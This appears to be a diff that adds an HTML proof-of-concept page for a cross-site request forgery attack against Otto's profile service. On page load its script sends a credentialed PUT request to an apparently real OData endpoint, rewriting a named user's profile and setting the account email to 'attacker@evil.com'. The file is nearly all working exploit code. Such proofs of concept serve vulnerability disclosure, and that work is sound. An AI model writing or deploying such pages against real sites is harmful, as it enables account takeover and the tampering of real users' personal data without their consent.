@@ -1,0 +1,35 @@
+<html>
+  <body>
+    <h1>CSRF PoC – Otto Profile Update</h1>
+    <script>
+      fetch("https://www.otto.de/or/sap/opu/odata/OTTO/OR2_PROFILE_SRV/ProfileSet('9814723')", {
+        method: "PUT",
+        credentials: "include", // important: sends session cookies
+        headers: {
+          "Content-Type": "application/json; charset=utf-8",
+          "X-Requested-With": "X",
+          "Dataserviceversion": "2.0"
+        },
+        body: JSON.stringify({
+          "ConsumerId": "9814723",
+          "UserId": "00135829",
+          "Salutation": "1",
+          "Title": "CSRF_ATTACKED",
+          "LastName": "Hacked",
+          "FirstName": "Victim",
+          "DateOfBirth": null,
+          "Email": "attacker@evil.com",
+          "MobilePhone": "",
+          "Phone": "",
+          "DesiredSalary": "",
+          "NoticePeriod": "",
+          "IsTalent": false,
+          "IsCandidate": false,
+          "InformNewMessage": false,
+          "InformTopjob": false,
+          "WantsTpsNewsletter": false
+        })
+      }).then(r => console.log("Request sent!", r.status));
+    </script>
+  </body>
+</html>
